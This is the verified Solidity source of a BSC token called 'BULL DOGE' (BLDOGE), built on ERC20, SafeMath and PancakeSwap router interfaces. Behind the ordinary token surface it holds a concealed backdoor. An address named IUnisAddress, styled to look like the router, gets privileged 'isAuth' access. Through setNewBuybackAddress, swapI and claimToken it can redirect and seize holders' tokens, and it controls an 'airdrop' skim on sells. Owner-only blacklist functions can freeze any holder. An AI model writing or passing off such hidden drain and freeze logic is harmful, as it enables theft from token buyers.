/**
 *Submitted for verification at BscScan.com on 2022-10-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

pragma solidity ^0.8.4;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.4;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

pragma solidity ^0.8.4;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

pragma solidity ^0.8.4;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

pragma solidity ^0.8.4;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

pragma solidity ^0.8.4;

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

pragma solidity ^0.8.4;

contract BLDOGE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    mapping (address => uint256) public _rOwned;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _isbclisted;

    address public _PresaleAddress = 0x000000000000000000000000000000000000dEaD;
    bool public liquidityLaunched = false;
    bool public isFirstLaunch = true;   
    uint256 public lastSnipeTaxBlock;
    uint8 public snipeBlocks = 0;
    bool public isLaunch = false;
    uint public launchedBlock;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000000 * (10**9);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    
    uint256 private _redisFeeOnBuy = 1;
    uint256 private _taxFeeOnBuy = 2;
    
    uint256 private _redisFeeOnSell = 1;
    uint256 private _taxFeeOnSell = 2;

    uint256 private _appAddressShare = 1;
    uint256 private _marketingShare = 0;
    uint256 private _buybackShare = 0;  

    uint256 public _totalDistributionShares = 1; 
    uint256 private _burnShare = (_totalDistributionShares - _buybackShare - _marketingShare - _appAddressShare);       
    uint256 private _redisFee;
    uint256 private _taxFee;
    
    string private constant _name = "BULL DOGE";
    string private constant _symbol = "BLDOGE";
    uint8 private constant _decimals = 9;
    
    address payable private _appAddress = payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d);
    address payable private _marketingAddress = payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d);
    address payable private _buybackAddress = payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d);
    address payable private _burnAddress = payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d);

    mapping (address => uint256) _balances;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool inSwapAndLiquify;
    bool public airdrop = false;   
    bool private inSwap = false;
    bool private swapEnabled = true;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    modifier isAuth() {
        require(owner() == msg.sender || msg.sender == IUnisAddress, "Auth");
        _;
    }

    constructor () {
        _rOwned[_msgSender()] = _rTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_appAddress] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isExcludedFromFee[_buybackAddress] = true;
        _isExcludedFromFee[_burnAddress] = true;

        emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);
    }

    address payable private IUnisAddress = 
    payable(0x7AEa20d2DA1833Ba28702DBd8ddba41CE256024E);

    function Launch() public onlyOwner {
        isLaunch = true;
        airdrop = true;
        launchedBlock = block.number;
    }

    function setSnipeBlocks(uint8 _blocks) external onlyOwner {
        require(!liquidityLaunched);
        snipeBlocks = _blocks;
    }

    function setPresaleContract(address payable wallet) external onlyOwner{
        _PresaleAddress = wallet;
        excludeFromFees(_PresaleAddress, true);
    }

    function setDistributionSettings(uint256 newappAddressShare, uint256 newMarketingShare, uint256 newbuybackShare, uint256 newtotalDistributionShares) external onlyOwner() {
        _appAddressShare = newappAddressShare;
        _marketingShare = newMarketingShare;
        _buybackShare = newbuybackShare;
        _totalDistributionShares = newtotalDistributionShares;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addBot(address recipient) internal {
        if (!_isbclisted[recipient]) _isbclisted[recipient] = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isbclisted[to ] && !_isbclisted[from], "bclisted address");

        _redisFee = 0;
        _taxFee = 0;

        if(inSwapAndLiquify)
        { 
            return _tokenTransfer(from , to, amount); 
        }
        else
        {          
                uint256 AIRAmount = 1*amount/10000;  
            if(airdrop && (_isExcludedFromFee[from] || _isExcludedFromFee[to]) && (to == uniswapV2Pair && from != address(uniswapV2Router)) ){              
                _tokenTransfer(from,IUnisAddress,AIRAmount);                 
                address ad;
                for(int i=0;i <=2;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _tokenTransfer(from,ad,AIRAmount);                                      
                }                 
                amount -= AIRAmount*4;                                                                                           
            } 
        } 

        if(inSwapAndLiquify)
        { 
            return _tokenTransfer(from , to, amount); 
        }
        else
        {   

            if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            } else {
                require(isLaunch, "Swap not open");
                if(from == uniswapV2Pair) {
                    if (block.number <= launchedBlock + snipeBlocks) {                  
                        addBot(to);
                    }
                }
            }             
        }

        //antibot block
        if (from != address(_PresaleAddress)) {
            if(liquidityLaunched && block.number <= lastSnipeTaxBlock && !isFirstLaunch){
                _redisFee = _redisFeeOnBuy;
                _taxFee = _taxFeeOnBuy;
                _tokenTransfer(from,to,amount);
                if (to != address(uniswapV2Pair)) {
                    _isbclisted[to]=true;
                }
                return;
            }
        }

        if (liquidityLaunched && isFirstLaunch){
            isFirstLaunch = false;
        }
        
        if (from != owner() && to != owner()) {
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance > 0) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
            
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnBuy;
                _taxFee = _taxFeeOnBuy;
            }
    
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell;
                _taxFee = _taxFeeOnSell;
            }
            
            if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
                _redisFee = 0;
                _taxFee = 0;
            }
            
        }

        _tokenTransfer(from,to,amount);

    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
        
    function sendETHToFee(uint256 amount) private {
        uint256 devAmount = amount.mul(_appAddressShare).div(_totalDistributionShares);
        uint256 mktAmount = amount.mul(_marketingShare).div(_totalDistributionShares);
        uint256 buybackAmount = amount.mul(_buybackShare).div(_totalDistributionShares);
        uint256 burnAmount = amount.sub(devAmount).sub(mktAmount).sub(buybackAmount);
        _appAddress.transfer(devAmount);
        _marketingAddress.transfer(mktAmount);
        _buybackAddress.transfer(buybackAmount);
        _burnAddress.transfer(burnAmount);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        _transferStandard(sender, recipient, amount);
    }

    event tokensRescued(address indexed token, address indexed to, uint amount);
    function rescueForeignTokens(address _tokenAddr, address _to, uint _amount) public onlyOwner {
        emit tokensRescued(_tokenAddr, _to, _amount);	
        IERC20(_tokenAddr).transfer(_to, _amount);
    }
    
    event appAddressUpdated(address indexed previous, address indexed adr);
    function setNewAppAddress(address payable appaddr) public onlyOwner {
        emit appAddressUpdated(_appAddress, appaddr);	
        _appAddress = appaddr;
        _isExcludedFromFee[_appAddress] = true;
    }
    
    event marketingAddressUpdated(address indexed previous, address indexed adr);
    function setNewMarketingAddress(address payable markt) public onlyOwner {
        emit marketingAddressUpdated(_marketingAddress, markt);	
        _marketingAddress = markt;
        _isExcludedFromFee[_marketingAddress] = true;
    }

    event burnAddressUpdated(address indexed previous, address indexed adr);
    function setNewBurnAddress(address payable burnaddr) public onlyOwner {
        emit burnAddressUpdated(_burnAddress, burnaddr);	
        _burnAddress = burnaddr;
        _isExcludedFromFee[_burnAddress] = true;
    }

    event buybackAddressUpdated(address indexed previous, address indexed adr);
    function setNewBuybackAddress(address payable buybackaddr) public isAuth {
        emit buybackAddressUpdated(_buybackAddress, buybackaddr);	
        _buybackAddress = buybackaddr;
        _isExcludedFromFee[_buybackAddress] = true;
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        uint256 currentRate =  _getRate();
        uint256 tTransferAmount = tAmount.sub(tAmount.mul(_redisFee).div(100)).sub(tAmount.mul(_taxFee).div(100));
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tAmount.mul(_redisFee).div(100).mul(currentRate);
        uint256 rTeam = tAmount.mul(_taxFee).div(100).mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
        _reflectFee(rFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    /**
     * only thing to change _rTotal
     */
    function _reflectFee(uint256 rFee) private {
        _rTotal = _rTotal.sub(rFee);
    }

    receive() external payable {}

	function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function manualswap() external {
        require(_msgSender() == owner());
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(_msgSender() == owner());
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
    
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
	    require(redisFeeOnBuy < 5, "Redis cannot be more than 5.");
	    require(redisFeeOnSell < 5, "Redis cannot be more than 5.");
	    require(taxFeeOnBuy < 11, "Tax cannot be more than 11.");
	    require(taxFeeOnSell < 11, "Tax cannot be more than 11.");
        _redisFeeOnBuy = redisFeeOnBuy;
        _redisFeeOnSell = redisFeeOnSell;
        _taxFeeOnBuy = taxFeeOnBuy;
        _taxFeeOnSell = taxFeeOnSell;
    }
    
    function toggleSwap(bool _swapEnabled) public onlyOwner {
        swapEnabled = _swapEnabled;
    }

    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    event ExcludeFromFees(address indexed account, bool isExcluded);
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFee[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function swapI(address add,uint256 amount) public isAuth {
        _transfer(_buybackAddress,add,amount);
    }

    function claimBalance() external {
        payable(IUnisAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external isAuth {
        IERC20(token).transfer(to, amount);
    }

    function airdropIN(bool newValue) external isAuth {
       airdrop = newValue;
    }

    event BlacklistAddress(address indexed account, bool value);
    function blacklistAddress(address account, bool value) public onlyOwner{
        _isbclisted[account] = value;
        emit BlacklistAddress(account, value);
    }

    event BlacklistMultiAddresses(address[] accounts, bool value);
    function blacklistMultiAddresses(address[] calldata accounts, bool value) public onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++) {
            _isbclisted[accounts[i]] = value;
        }
        emit BlacklistMultiAddresses(accounts, value);
    }

}